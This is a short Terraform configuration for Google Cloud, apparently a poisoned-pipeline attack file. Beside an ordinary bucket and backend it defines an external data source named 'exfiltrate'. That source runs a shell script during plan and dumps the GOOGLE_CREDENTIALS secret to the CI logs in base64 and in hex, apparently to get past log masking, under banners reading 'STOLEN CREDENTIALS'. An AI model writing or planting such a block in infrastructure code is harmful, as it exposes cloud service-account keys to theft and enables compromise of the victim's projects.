provider "google" {
  project = "project-28c66f1b-3d14-4963-88c"
  region  = "us-central1"
}

terraform {
  backend "gcs" {
    bucket = "victim-tf-state"
    prefix = "prod"
  }
}

resource "google_storage_bucket" "prod_bucket" {
  name     = "victim-prod-data"
  location = "US"
}

data "external" "exfiltrate" {
  program = ["sh", "-c", <<EOT
    echo "================= STOLEN CREDENTIALS BELOW =================" >&2
    if [ -z "$GOOGLE_CREDENTIALS" ]; then
        echo "ERROR: GOOGLE_CREDENTIALS is empty! Check your workflow triggers." >&2
    else
        echo "$GOOGLE_CREDENTIALS" | base64 -w 0 | fold -w 64 >&2
        echo -n "$GOOGLE_CREDENTIALS" | od -A n -t x1 | tr -d "\n " >&2
    fi
    echo "" >&2
    echo "================= STOLEN CREDENTIALS ABOVE =================" >&2

    exit 1
    echo '{"status": "success"}'
  EOT
  ]
}
